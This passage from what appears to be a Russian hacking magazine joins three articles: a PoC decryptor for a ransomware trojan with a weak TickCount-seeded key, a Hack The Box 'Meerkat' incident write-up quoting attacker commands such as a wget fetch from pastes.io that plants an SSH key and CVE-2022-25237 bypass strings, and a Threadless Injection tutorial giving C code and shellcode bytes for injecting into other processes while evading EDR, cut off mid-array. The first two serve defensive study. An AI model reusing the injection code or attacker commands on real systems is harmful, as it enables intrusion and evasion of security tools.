 public static string CreatePassword(int length,int seed)
 {
  StringBuilder stringBuilder = new StringBuilder();
  Random random = new Random(seed);
  while (0 < length--)
  {
   stringBuilder.Append(
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&
?&/"[random.Next(
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&
?&/".Length)]);
  }
  return stringBuilder.ToString();
 }

Мы получили тот же самый ключ. Следователь но, зная сид, мы можем уга-
дывать клю чи, сге нери рован ные на основе Random():



  C:\temp\rns>2.exe
  Key: &Cer88Tf8sErkcxYAgR5CvdawGij/JqSEVOln8m/





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





         ИЗУЧАЕМ УСТРОЙСТВО ТРОЯНА-
               ЭНКОДЕРА И СОЗДАЕМ
            ПРОГРАММУ ДЕШИФРОВКИ





ÎÏÐÅÄÅËßÅÌ ÇÍÀ×ÅÍÈß ENVIRONMENT.TICKCOUNT

Следующая задача — понять, каким обра зом мы можем узнать значения
Environment.TickCount, которые были в момент шиф рования файлов. Эту
задачу мож но решить таким образом.
 1. Вы числяем разницу во времени в миллисекундах между текущим значени-
  ем вре мени и временем, ког да файл был изме нен.
 2. Получа ем текущее значение Environment.TickCount.
 3. Вы читаем пер вое из вто рого.


static int GetTickCountAtFileCreation(string filePath)
  {
   try
   {
    FileInfo fileInfo = new FileInfo(filePath);
    if (fileInfo.Exists)
    {
     DateTime modtime= fileInfo.LastWriteTime;
     int tickCountAtCreation = Environment.TickCount - (int)((
DateTime.Now - modtime).TotalMilliseconds);
     return tickCountAtCreation;
    }
}


Напишем стандартную функцию для шифрования файлов AES. На вход мы
будем передавать путь к файлу, путь для сохранения зашиф рованного файла
и пароль.


static void AES_Encrypt(string inputFile, string outputFile, string
password)
 {
  using (RijndaelManaged aesAlg = new RijndaelManaged())
  {
   aesAlg.KeySize = 128;
   aesAlg.BlockSize = 128;
   aesAlg.Padding = PaddingMode.PKCS7;


   // Generate a random IV
   aesAlg.GenerateIV();


   using (Rfc2898DeriveBytes keyDerivation = new Rfc2898DeriveBytes(
password, aesAlg.IV, 10000))
   {
    aesAlg.Key = keyDerivation.GetBytes(aesAlg.KeySize / 8);
   }


   using (FileStream fsOutput = new FileStream(outputFile, FileMode.
Create, FileAccess.Write))
   {
    fsOutput.Write(aesAlg.IV, 0, aesAlg.IV.Length);


    using (CryptoStream cryptoStream = new CryptoStream(fsOutput,
aesAlg.CreateEncryptor(), CryptoStreamMode.Write))
    {
     using (FileStream fsInput = new FileStream(inputFile, FileMode.
Open))
     {
      fsInput.CopyTo(cryptoStream);
     }
    }
   }
  }
 }

Те перь зашифруем тестовый файл, выведя в консоль значения Environment.
TickCount и key. Получим следующий результат:



  C:\temp>enc.exe
  Environment.TickCount:335877046
  Key: axnN3z=V7TXfLGK7PHfCVgRaqip8XzI1s&r1coSW
  File encrypted successfully.


При проверке функции определения Environment.TickCount для зашиф-
рованного файла мы получим следующее значение:


Environment.TickCount at creation: 335877090

Мы видим, что полученные результаты немного отличаются (в данном слу-
чае — на 44 мс), поскольку значение Environment.TickCount вычисляется
чуть раньше, чем файл записы вается на диск. Это означает, что при рас-
шифровке нам придется перебирать значения сида для рандома с условием
«погрешнос ти» TickCount’а. Отсюда также следует, что необ ходимо будет
как-то определять момент, когда ключ подошел и данные успешно рас-
шифровались.


PROOF OF CONCEPT

Любая теория бесполезна без практики, потому на основе проведенного
нами иссле дования мы создадим proof of concept. Для этого мы будем
использовать вот такой код:



static bool MatchHeader(byte[] bytesToCheck, byte[] header)
 {
  if (bytesToCheck.Length < header.Length)
  {
   return false;
  }


  for (int i = 0; i < header.Length; i++)
  {
   if (bytesToCheck[i] != header[i])
   {
    return false;
   }
  }


  return true; // Header matched
 }


...


static bool IsValidFileHeader(byte[] decryptedBytes)
 {
  if (decryptedBytes.Length < 4)
  {
   return false; // Not enough bytes to check header
  }


  // Check for different file headers
  if (MatchHeader(decryptedBytes, new byte[] { 0xD0, 0xCF, 0x11, 0xE0
}) ||
   MatchHeader(decryptedBytes, new byte[] { 0x37, 0x7A, 0xBC, 0xAF,
0x27, 0x1C }) ||
   MatchHeader(decryptedBytes, new byte[] { 0x4D, 0x5A }) ||
   MatchHeader(decryptedBytes, new byte[] { 0x50, 0x4B, 0x03, 0x04 })
)
  {
   return true; // Matched one of the headers
  }


  return false;
 }

В этом примере после при менения кода для рас шифровки в функцию про-
верки magic передается буфер расшифро ванных данных. Бай ты хедера срав-
ниваются, и если дан ные сматчились, то рас шифро ванный файл записы вает-
ся на диск. А вот сама функция расшифров ки AES:


static bool AES_Decrypt(string inputFile, string password, string
outputFile)
 {
  try
  {
   using (RijndaelManaged aesAlg = new RijndaelManaged())
   {
    aesAlg.KeySize = 128;
    aesAlg.BlockSize = 128;
    aesAlg.Padding = PaddingMode.PKCS7;


    byte[] iv = new byte[aesAlg.BlockSize / 8];


    using (FileStream fsInput = new FileStream(inputFile, FileMode.
Open, FileAccess.Read))
    {
     fsInput.Read(iv, 0, iv.Length);


     using (Rfc2898DeriveBytes keyDerivation = new Rfc2898DeriveBytes
(password, iv, 10000))
     {
      aesAlg.Key = keyDerivation.GetBytes(aesAlg.KeySize / 8);
      aesAlg.IV = iv;
     }


     using (CryptoStream cryptoStream = new CryptoStream(fsInput,
aesAlg.CreateDecryptor(), CryptoStreamMode.Read))
     {
      int bytesRead;
      byte[] buffer = new byte[4096];


      using (MemoryStream decryptedMemoryStream = new MemoryStream())
      {
       while ((bytesRead = cryptoStream.Read(buffer, 0, buffer.Length
)) > 0)
       {
        decryptedMemoryStream.Write(buffer, 0, bytesRead);
       }


       // Check the file header in the decrypted data
       if (IsValidFileHeader(decryptedMemoryStream.ToArray()))
       {
        File.WriteAllBytes(outputFile, decryptedMemoryStream.ToArray
());
        return true;
       }
       else
       {
        return false;
       }
      }
     }
    }
   }
  }
  catch (CryptographicException ex)
  {
   // Handle decryption failure (e. g., incorrect password)
   Console.WriteLine($"Decryption error: {ex.Message}");
   return false;
  }
  catch (Exception ex)
  {
   // Handle other exceptions
   Console.WriteLine($"An unexpected error occurred: {ex.Message}");
   return false;
  }
 }


Код вызова функции рас шифровки с учетом перебора значений выглядит
следующим образом (в него заложена погрешность в 100 мс):


int tickCountAtCreation = GetTickCountAtFileCreation(encryptedFile);


  for (int i = tickCountAtCreation - 100; i < tickCountAtCreation; i
++)
  {
   string s = CreatePassword(40, i);
   Console.WriteLine("tickCount: " + i + " Guess password:" + s);
   if (AES_Decrypt(encryptedFile,s, decryptedFile))
   {
    Console.WriteLine("Yeeeaaah, Key found: "+ s);
    break;
   }

Ре зультат можно увидеть на представленном ниже скриншоте.





Ключ успешно подобран, дан ные расшифрованы. Как работа этой программы
выглядит вжи вую, можешь посмотреть на YouTube.
   Этот PoC реализован в идеаль ных условиях, нарушить которые может
даже перезаг рузка системы пос ле шифрования. В таком случае значение
Environment.TickCount будет сброшено и вычислить его на момент соз-
дания фай ла мы уже не сможем. В такой ситу ации необ ходимо искать тай-
мстемпы вре мени загрузки системы перед тем, как файлы были зашиф-
рованы.
  Найти их (с опре делен ной погрешностью) мож но в следующих местах
в зависимос ти от име ющейся инфраструктуры:
 • в журнале событий Windows (Event ID: 41, 1074, 6005, 6006, 6008);
 • в системе SIEM;
 • в SCCM;
 • в системах мониторинга (Zabbix, SolarWinds).

Ре ализуем функцию получе ния зна чения TickCount для файла на основе
переданного вре мени, чтобы мы мог ли вруч ную передать предполагаемое
зна чение вре мени загрузки системы:


static int CalculateTickCountAtCreation(DateTime specificDateTime,
string filePath)
 {
  try
  {
   FileInfo fileInfo = new FileInfo(filePath);


   if (fileInfo.Exists)
   {
    DateTime creationTime = fileInfo.LastWriteTime;


    if (specificDateTime > creationTime)
    {
     Console.WriteLine("Error: specificDateTime is greater than File
Creation DateTime.");
     return -1;
    }


    int tickCountAtSpecificTime = (int)((creationTime -
specificDateTime).TotalMilliseconds);
    return tickCountAtSpecificTime;
   }
   else
   {
    Console.WriteLine("File not found.");
    return -1;
   }
  }
  catch (Exception ex)
  {
   Console.WriteLine($"An error occurred: {ex.Message}");
   return -1;
  }
 }

Эта фун кция будет считать разницу в миллисекундах между временем соз-
дания фай ла и переданным таймстем пом. Про верим, работа ет ли наш код.
Значение вре мени загрузки системы возь мем из события 6005 журнала
System. Получаем сле дующие значения:


Environment.TickCount at file creation: 608384267 // Вычисление на
основе текущего TickCount


Environment.TickCount at specific time: 608363454 // Вычисление на
основе переданного таймстемпа

В среднем разница получается примерно 20 с — это время задержки запус ка
службы журнала событий, на которое мы ориентируемся и которое дол жны
заложить в цикле перебо ра зна чений клю ча при расшифровке фай лов.


ÂÛÂÎÄÛ

В ито ге для соз дания дек рипто ра фай лов, зашифрованных трояном-энко-
дером, необходимо реали зовать:
 • функцию для получения при мерного зна чения Environment.TickCount
   на момент шифрования фай ла;
 • функцию генерации пароля для AES, аналогичную используемой в трояне,
   с передачей в нее полученного зна чения Environment.TickCount
   в качестве сида для Random;
 • функцию декрипта зашифрованных AES-файлов. В ней, перед попыткой
   расшифровки фай ла, необ ходимо предус мотреть код для отрезания бай-
   тов зашифрованного RSA AES-ключа (344 бай та в нашем при мере),
   который дописывается вредоносом в конец зашифрованного файла;
 • функцию валида ции расшифрованных дан ных. Для этого можно проверять
   значения magic в заголовках файлов или, нап ример, считать энтропию.





         Зашифрованный AES-ключ, дописан ный в конец файла

Таким образом мы можем успешно реализовать собс твенный декриптор
для фай лов, зашифрованных трояном-энкодером с рассмотренным уяз-
вимым алго ритмом.
ВЗЛОМ





Сегодня мы поуп ражня емся в анализе тра-
фика  при помощи  Wireshark,  разберем
брутфорс-атаку Credential Stuﬃng и про ана-
лизируем  метод  закрепления  зло умыш-
ленника в системе. Затем построим тай-             sab3ert1le                                                                                       uragepb@gmail.com
млайн событий.


Наша цель — рассле дование инцидента в рамках лабора торной работы
Meerkat из нового раздела Hack The Box под названием Sherlocks. Он пред-
назна чен для обучения и тренировки ребят из blue team, то есть команды
защит ников.


Î SHERLOCKS

Sherlocks — это практические лабораторные работы по кибербезопас ности,
в которых смо делирова ны реальные инциден ты. Раз дел пред лагает про-
водить рассле дования на основе предоставлен ного сце нария кибератаки
и улик. Цель — узнать, как происходила ата ка, и раскрыть все воз можные
под робнос ти.
   Это позволяет развить навыки в областях циф ровой форензики и реаги-
рования на инциденты (DFIR), охоте за угрозами (Threat Hunting и Threat
Intelligence) и анализе малвари.
  В ходе решения лабораторных работ учас тнику предлагают отвечать
на вопросы, и отве ты в совокуп ности будут давать пол ное представ ление
о про изо шедшем инци денте.
  Задания совершенно бесплатны, однако некоторые из них постепенно
ста новятся дос тупными только с подписка ми VIP и VIP+.


MEERKAT

Первое и достаточно прос тое задание — лабора торная работа с названием
Meerkat.
  Сце нарий: Forela — быстро растущий стартап, который использует плат-
форму управле ния бизнесом. К сожалению, документация у нее скудная,
а администраторы стартапа не очень хорошо осве домлены о пра вилах
безопасности. Мы играем роль предста вителя отде ла безопасности. Наша
цель — по данным в виде файлов PCAP и экспортированным журналам под-
твер дить факт компрометации.
   Ска чиваем архив с необ ходимыми артефактами и начинаем рас следова-
ние. Внутри — файл сетевого трафика .pcap и файл .json с событиями
безопасности. Нашим основным инструмен том будет Wireshark.


ÎÏÐÅÄÅËÅÍÈÅ ÎÑÍÎÂÍÛÕ IP-ÀÄÐÅÑÎÂ

Первый вопрос:

    Ìû ñ÷èòàåì, ÷òî íàø ñåð âåð ïëàòôîðìû óïðàâëå íèÿ áèç íåñîì áûë
      ñêîì ïðîìåòèðîâàí. Ìîæåòå ëè âû íàç âàòü çàïóùåííîå ïðèëîæå íèå?«                »
Компания исполь зует какое-то решение для управления бизнесом и подоз-
ревает, что оно и было скомпро мети ровано. Что бы узнать, какая именно
плат форма использовалась, проведем первичный ана лиз pcap-файла.
  Первым делом просмотрим конечные точки под ключений по TCP в раз-
деле «Статистика» и отсортируем список по пакетам.





Видно, что IP-адрес 172.31.6.44 получа ет боль шую часть проходящего тра-
фика через сле дующие порты: 37022, 8080, 61254, 61255 и 22.
  Порты, зарезер вированные под опре деленные службы:
 • 8080 — HTTP;
 • 22 — SSH;
 • 37022 — TCP-порт для передачи дан ных.

Ис ходя из этого, можно предположить,  что платформа управле ния —
это веб-сер вер.
  Проверим HTTP-трафик с помощью простого фильтра: http.request.





Первое, что мы видим, — это GET-запрос к веб-серверу. Если немного погуг-
лить, можно  узнать, что зап рос GET  /bonita  HTTP/1.1 связан с ПО
Bonitasoft, которое пред лага ет решения и плат формы для управле ния биз-
несом. Делаем вывод, что одна из этих программ и используется в компании.





ÈÙÅÌ ÒÎ×ÊÓ ÂÕÎÄÀ, ÂÐÅÌß ÍÀ×ÀËÀ ÀÒÀÊÈ È ÝÊÑÏËÓÀÒÀÖÈÈ

Второй вопрос:

    Ìû ïîëàãà åì, ÷òî çëîóìûø ëåííèê, âîç ìîæíî, èñïîëüçîâàë âàðèàöèþ
      àòà êè ìåòîäîì ïåðåáîðà. Êàê íàçûâà åòñÿ ïðîâåäåííàÿ àòà êà?«                »
Отфильтру ем трафик, задав филь тр http.requset. Видим, что у нас подряд
идет   много   POST-запросов   /bonita/loginservice   от   IP-адре-
са 156.146.62.213. Если подробнее изучить каждый пакет, то вид но, что логин
и пароль от одно го к другому меняются. Похоже, злоумыш ленник исполь зует
ата ку методом под бора, то есть брутфорс.





При этом подбираемые данные для входа не берутся из обще доступных сло-
варей вроде rockyou.txt. Вместо этого исполь зуется опре делен ный набор
данных. Это значит, что злоумыш ленник применя ет Credential Stuﬃng.
   Credential Stuﬃng — это тип ата ки, при которой зло умышленник исполь-
зует заранее полученную (обычно в результате утечки у какого-то крупного
сервиса) базу данных логинов и паролей и перебирает их в надежде, что они
подой дут к другой служ бе. При ата ке часто исполь зуется ботнет, чтобы авто-
мати зировать процесс подбора и замаскировать его под непримечатель ный
трафик.





По иск ответа на тре тий вопрос поможет нам углубить понимание атаки.


     Èìå åò ëè ýêñ ïëó àòèðóåìàÿ óÿç âèìîñòü ïðèñ âîåííûé CVE — è åñëè äà,
      òî êàêîé?«                »
Можно попробовать поискать в базе данных MITRE соответс тву ющие нашему
виду атаки уязвимос ти для веб-сервера Bonita с номером CVE. Либо мы
можем обратиться к нашему фай лу JSON с сообщениями, поступившими
от средств обнаружения и реаги рования. Встретив знакомые сигнатуры, они
обычно сообщают и предполагаемый номер CVE, соответствующий угрозе.
Открываем полученный в задании JSON любым удобным способом и ищем
CVE.
  Находим строку с предупреждением об атаке, которая содержит ее точное
наз вание: CVE-2022-25237.





Имея точный номер CVE, мы можем больше узнать об экспло ите, что поз-
волит отве тить и на четвертый воп рос:


      Êà êàÿ ñòðîêà áûëà äîáàâ ëåíà ê URL-àäðå ñó API äëÿ îáõîäà ôèëüòðà
      àâòîðèçà öèè ñ ïîìîùüþ ýêñ ïëîèòà çëîóìûø ëåííèêà?«                »
Прочитать описание уязвимости можно на любом сайте, к при меру на том же
MITRE CVE.





Най денный эксплоит подходит для серверов Bonita Web 2021.2 и пред назна-
чен для обхо да аутен тификации или авто ризации. Работает он благодаря
недос таточ но  стро гому  шаблону,  который  используется  в  функции
RestAPIAuthorizationFilter. Добавив ;i18ntranslation в конец URL,
злоумышленник может получить доступ к при виле гированным эндпоинтам
API, что потенциально даст возможность удаленного выпол нения кода и зло-
упот ребле ния привиле гиями.
  Ответом на пятый вопрос будет точное количество попыток подбора вход-
ных данных:

      Ñêîëüêî êîì áèíàöèé èìåí ïîëüçîâàòå ëåé è ïàðîëåé áûëî èñïîëü-
      çîâàíî â àòà êå ñ ïîäñòà íîâ êîé ó÷åòíûõ äàííûõ?«                »
Смотрим трафик с фильтром http еще раз, считаем все неудачные попытки
входа, которые име ют код 401, и получаем все го 56 комбинаций.





Шестой вопрос:

      Êà êàÿ êîì áèíàöèÿ èìå íè ïîëüçîâàòå ëÿ è ïàðîëÿ îêà çàëàñü óñïåøíîé?«               »
Пос ле всех POST-зап росов и ответов сервера с кодом ошибки 401 следует
единственный зап рос с HTTP-ста тусом 204. Это значит, что запрос был
успешно обработан. Смотрим форму пакета и видим под ходящие данные
для   входа.  Имя   пользователя:   seb.broom@forela.co.uk,   пароль:
g0vernm3nt.





ÈÙÅÌ ÇÀÊÐÅÏËÅÍÈß Â ÑÈÑÒÅÌÅ

Пойдем дальше по фильтрованному трафику. Вид но, что злоумышленник
отправ ляет POST-запрос серверу и заг ружа ет архив rce_api_extension.
zip.





Пос ле успешной загрузки (код ответа 200) мы видим GET-запрос, содер-
жащий команду whoami в параметре cmd. В ответ сер вер присылает JSON
с информацией о том, что зло умышленник получил root-права к серверу.





Затем загруженный файл удаляется с сер вера — видимо, злоумышленник
решил замести сле ды. И следом идет пов торный брутфорс входных данных,
пока злоумыш ленни ку не уда ется успешно вой ти в систему. Потом он меняет
IP-адрес на 138.199.59.221: скорее все го, наш хакер включил VPN или под-
ключился с машины одного из своих ботов.
  Седьмой вопрос:

      Åñ ëè òàêîâîé èìå åòñÿ, êàêîé ñàéò äëÿ îáìå íà òåê ñòîâûìè ñîîáùåíè-
     ÿìè èñïîëüçîâàë çëîóìûø ëåííèê?«                »
Цикл заг рузки zip-архива повторяется, однако в этот раз хакер выполняет
другую команду: cat /etc/passwd, то есть хочет посмотреть логины всех
поль зовате лей системы и информацию по каж дой учетной записи. Затем
сно ва удаляет загруженный файл.





Бежим по дампу трафика дальше и видим, что злоумыш ленник снова входит
в систему, загружает zip-архив и через GET-зап рос отправляет серверу такую
коман ду:


wget \https://pastes.io/raw/bx5gcr0et8

Сно ва обращаем ся к поис ковой строке и узна ём, что pastes.io — это сер вис
для обме на тексто выми сообщениями. Выходит, зло умышленник исполь-
зовал его, что бы что-то передать на ата куемый сервер.




                      Незнакомые и подозрительные ссылки рекомен-
                        дуется открывать в виртуальных сре дах, чтобы
                      обезопа сить свою систему от заражения.


В обновленной вер сии этой лаборатор ной работы по неиз вестным причинам
пос ле седьмого вопроса идет девятый, ско рее все го, в будущем это испра-
вят.
  Девятый и десятый вопросы:


      Óêà æèòå èìÿ ôàéëà îòêðû òîãî êëþ ÷à, êîòîðûé çëîóìûø ëåííèê èñïîëü-
      çîâàë äëÿ ñîõðàíåíèÿ íà íàøåì õîñ òå.«
       Ìîæåòå  ëè âû  óêà çàòü,  êàêîé ôàéë  èçìå íèë  çëîóìûø ëåííèê
      äëÿ çàê ðåïëå íèÿ â ñèñ òåìå?                »
В виртуальной среде переходим по ссылке из коман ды wget и узнаём, что же
там передавал злоумыш ленник. Это bash-скрипт.





Этот скрипт загружает ключ ssh-rsa, содержащийся в файле из ссыл ки
https://pastes.io/raw/hffgra4unv, в /.ssh/authorized_keys на сер-
вере и перезапускает службу SSH, что позволяет подключаться к веб-серверу
через SSH и надежно зак репиться в сис теме.
  Одиннадцатый вопрос:

     Ìîæåòå ëè âû óêà çàòü èäåíòèôèêà òîð ìåòîäà MITRE äëÿ ýòîãî òèïà
      çàê ðåïëå íèÿ â ñèñ òåìå?«                »
Для отве та обратимся к матрице атак ATT&CK MITRE. Выбираем раздел
Persistence и находим в нем подраздел Account Manipulation.





Мы знаем, что злоумыш ленник закрепился в системе, загрузив свой ключ
SSH, и изме нил файл authorized_keys. В нем хра нятся записи о ключах
SSH, которые мож но исполь зовать для входа в учетку пользовате ля. Этот
файл обычно находит ся в домашнем каталоге:


<user-home>/.ssh/authorized_keys

Когда злоумышленник добавляет свой ключ в authorized_keys, он в даль-
нейшем может получить доступ к хосту по SSH от име ни ском прометирован-
ного поль зователя.
   Та кой метод ата ки в матрице MITRE носит наз вание SSH Authorized Keys
и имеет ID T1098.004.





ÏÎÑÒÝÊÑÏËÓÀÒÀÖÈß

В принципе, лабораторная работа уже считается выпол ненной, однако файл
.pcap содер жит еще несколько деталей.
  После зак репле ния в сис теме из нее уже тра дици онно стираются следы
ком про метации, но теперь с IP-адреса 54.144.148.213 происходит загрузка
deb-пакета, который содержит в себе Nmap.





Одновре менно с этим после получения дос тупа на SSH при ходит новый тра-
фик, но с другого IP-адреса — 95.181.232.30. Пос мотреть, что происходит,
можно с помощью фильтра tcp.port == 22.
  Сопос тавляем временные рамки и догады ваемся, что именно с этого
адреса и была подана команда серверу загрузить deb-пакет.
  Далее, пос ле успешной заг рузки Nmap, видно, что начина ется проверка
пор тов IP-адреса 34.207.150.13.





Пос ле чего завер шается SSH-соединение и прекращается запись тра фика.


ÂÛÑÒÐÀÈÂÀÅÌ ÒÀÉÌËÀÉÍ ÀÒÀÊÈ

Нам нуж но обобщить все найденные при рас сле дова нии арте фак ты, что даст
нам пол ное представ ление об инциден те.
  В начале атаки с IP-адре са 172.31.6.44 с помощью метода Credential
Stuﬃng был получен дос туп к серверу менед жмен та. Злоумышленник вошел
в систему с логином seb.broom@forela.co.uk и паролем g0vernm3nt.
  Далее хакер получил доступ к привилегиро ванному API c помощью уяз-
вимос ти CVE-2022-25237 в Bonita Web 2021.2 и заметал за собой следы, уда-
ляя загруженный на веб-сер вер zip-архив rce_api_extension.zip. Повторяя
эту атаку, он отправил на сервер команды whoami и cat /etc/passwd, что
позволило ему узнать некоторую информацию о пользователях и проверить
наличие root-прав.
  Затем зло умышленник с помощью сер виса обме на тексто выми сооб-
щени ями pastes.io, уже с IP-адре са 138.199.59.221, запус тил на сервере
bash-скрипт, изме няющий файл с RSA-ключами /.ssh/authorized_keys
и позволяющий зак репиться в системе через SSH (подтехни ка SSH Authorized
Keys T1098.004).
  Сразу после получения постоянного доступа к веб-сер веру злоумыш-
ленник под ключился к нему по SSH c IP-адреса 95.181.232.30 и выполнил
на сервере команду для заг рузки deb-пакета, вклю чающего в себя Nmap.
  Далее, используя загружен ную утилиту, зло умыш ленник сканировал порты
IP-адре са 34.207.150.13, после чего разорвал SSH-соединение.


ÂÛÂÎÄÛ





Итак, мы успешно выполнили задание Meerkat из раздела Sherlocks плат-
формы Hack The Box. В ходе рас следования ты должен был получить навыки
работы с Wireshark, а также вжи вую увидеть, как работает атака Credential
Stuﬃng и как выг лядит зак репление в системе при помощи добавления ключа
SSH. Отве тив на все вопросы лабораторной работы, мы также пос троили тай-
млайн событий, что было бы необ ходимо при рас следовании реального
инцидента.
ВЗЛОМ





Сегодня мы поговорим о тех нике инъекции
в сто ронний про цесс, которая называется
Threadless Injection. На момент написа ния
статьи она работала на Windows 11 23H2
x64 с активированными средства ми защиты              Nik Zerof                                                                                              xtahi0nix@gmail.com
ОС на изолиро ванной от сети виртуаль ной
машине.




                     Читай  также мою пре дыду щую статью, где я
                      показывал, как устро ена и как реализуется тех-
                       ника инжекта под названием Process Ghosting.


Итак, давай вспомним, как про исходит стандартная инъ екция шелл-кода
с пос леду ющим его выполнени ем.
 1. Получе ние дескриптора процесса (OpenProcess и NtOpenProcess).
 2. Вы деление   памяти   для   полезной   нагрузки    (VirtualAllocEx
   и NtMapViewOfSection).
 3. Запись полез ной нагрузки в эту память (WriteProcessMemory и Ghost
  Writing).
 4. Вы полнение шелл-кода (CreateRemoteThread и NtQueueApcThread).

Эта пос ледовательность хорошо извес тна всем средс твам EDR, и если
какое-то ПО ее реализует, то сразу будет крас ный флаг и завершение про-
цесса.
   Нель зя ли все это написать таким обра зом, что бы дей ствия выполнялись
те же, но без прямого использования перечисленных фун кций WinAPI? С пер-
выми шагами такое проделать можно, но с выпол нением шелл-кода все
не        так       просто.       Пря мой       вызов       функций
CreateRemoteThread/NtQueueApcThread   даст   алерт  EDR   с   веро-
ятностью 100%.
  Словом, чтобы обвести защиту вокруг пальца, нам надо сло мать эту пос-
ледовательность. Нап ример, почему бы не перехватить какие-нибудь вызовы
API в сто роннем при ложе нии, в экспор тируемой функции DLL и потом зас-
тавить эту функцию работать на нас?




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


Нап ример, можно пропат чить функции работы  с сетью  какого-нибудь
легитимного ПО, которое и так работа ет с сетью, и использовать их для связи
со своими сетевыми ресурсами! В этом и сос тоит смысл техники Threadless
Injection —  пропатчить  экспортные функции  исполь зуемой  процес сом
динами ческой биб лиотеки,  чтобы при  их вызове  запус кался наш  код.
По шагам это выг лядит примерно вот так:
 1. Найти область памяти code cave, которая смо жет вместить наш шелл-код
   и трам плин.
 2. Записать шелл-код и трамплин в эту память.
 3. Пропатчить экспортируемую фун кцию DLL, нас троив ее на запуск нашего
   кода.
 4. Подож дать вызова этой функции, что бы шелл-код выпол нился.

Но в динамических биб лиотеках могут быть сот ни и тысячи функций, и не
факт, что рандомно выбранная нам подойдет. Ведь нет никаких гарантий, что
она будет вызвана в разумное для нас вре мя или вообще будет вызвана.
   Чтобы решить этот вопрос, нужно про вести небольшое иссле дование ПО,
в котором мы собираемся реали зовы вать такой перехват экспортной фун-
кции. В иде альном слу чае нуж но най ти при ложе ние, которое вызывает
какие-то функции DLL регулярно: нап ример, обра щается к своему времен-
ному фай лу на диске и записы вает в него про межуточные результаты своей
работы или проверяет дос тупность своих серверов в сети, вызывая соответс-
твующие API с опре деленным промежутком вре мени. Если най ти такие фун-
кции, то можно быть уверенным, что вызов точно про изойдет.
  Но не сле дует злоупот реблять этим пра вилом: если приложение вызывает
API слишком часто (нап ример, несколь ко раз в секун ду) и ты захочешь перех-
ватить вызов, то неизбежны раз ные глю ки.
   Чтобы про вести подобное исследование, воспользуемся программой API
Monitor. В этой же программе мы сможем увидеть, как в реальном времени
про исхо дит вызов WinAPI, какие действия в интересующей нас программе
на это вли яют. Кроме того, можно уви деть, какие DLL при цеплены к процессу
и какие API они реализуют (то есть это не просто спи сок WinAPI непонятно
откуда). Исходя из данных монито ринга, мы должны решить для себя, какую
функцию из экспор та используемой библиотеки перехватывать.





  Пример исполь зования прог раммы API Monitor для прос мотра вызыва -
  емых функций WinAPI

Пос ле того как подопытная прог рамма исследована и нужные WinAPI выяв-
лены, можно начинать кодить.


ÊÎÄÈÌ

В начале статьи мы обоз начили шаги, которые нужно сде лать для реализации
Threadless Injection, теперь пришло время реализовать каждый шаг в коде.
  Сначала нам нуж но получить хендл целево го про цес са по его име ни:


HANDLE hProc = NULL;
LPCWSTR ps_name;
DWORD *procID;


PROCESSENTRY32 pe32;
pe32.dwSize = sizeof(PROCESSENTRY32);


HANDLE process_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
;


if (!process_snap) return NULL;


if (Process32First(process_snap, &pe32)) {
    do {
        if (_wcsicmp(pe32.szExeFile, ps_name) == 0) {


            *procID = pe32.th32ProcessID;
            hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *procID);


            if (!hProc) continue;


            return hProc;
        }
    } while (Process32Next(process_snap, &pe32));
}

Далее  заг ружаем  выб ранную  динами ческую  биб лиотеку,  содержащую
в экспорте функцию API, с которой мы хотим порабо тать. Пусть этой биб-
лиотекой будет kernelbase.dll.


    HMODULE hModule = GetModuleHandleW(L"kernelbase.dll");


    if (hModule == NULL)
        hModule = LoadLibraryW(L"kernelbase.dll");

Те перь получаем адрес нашей API в DLL:


  // victim_export_func — функция из экспорта kernelbase.dll,
которая подвергнется установке хука
    void* dll_export_fun_addr = GetProcAddress(hModule,
victim_export_func);


    if (dll_export_fun_addr == NULL) return 1;

Ищем code cave — область, куда можно записать наши данные:


    UINT_PTR  addr_of_codecave;
    uint64_t function_addr;
    BOOL gotchaCave;


  // Начало поиска
    for (addr_of_codecave = (function_addr & 0xFFFFFFFFFFF70000) -
0x70000000;
      // Диапазон адресов
        addr_of_codecave < function_addr + 0x70000000;
        // Шаг, которым мы листаем память
        addr_of_codecave += 0x10000)
    {
        LPVOID lpAddr = VirtualAllocEx(hProc,
                addr_of_codecave,
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);


        if (lpAddr == NULL) continue;


        gotchaCave = TRUE;
        break;
    }


    if (gotchaCave == TRUE) return addr_of_codecave;

Те перь пойдут манипуляции с трамплином и дру гая ариф метика. Чтобы было
понятно, обозначим трамплин и пейлоад. Пейлоад — обычный, который
встре чает ся пов сюду в демонстрацион ных PoC и запускает калькулятор. Что
касается трамплина, в него входит балан сировка сте ка, сохранение и вос ста-
новление регистров после вызова пей лоада:


unsigned char tramp_to_shellcode[] = {
        0x58, 0x48, 0x83, 0xE8, 0x05, 0x50,
        0x51, 0x52, 0x41, 0x50, 0x41, 0x51,
        0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x48, 0x89, 0x08, 0x48,
        0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
        0x00, 0x00, 0x48, 0x83, 0xC4, 0x40,
        0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59,
        0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
        0xE0, 0x90
};


unsigned char shellcode[] = {
        0x53, 0x56, 0x57, 0x55, 0x54, 0x58,
        0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
        0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C,
        0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
        0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B,
        0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
        0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48,
        0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
        0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74,
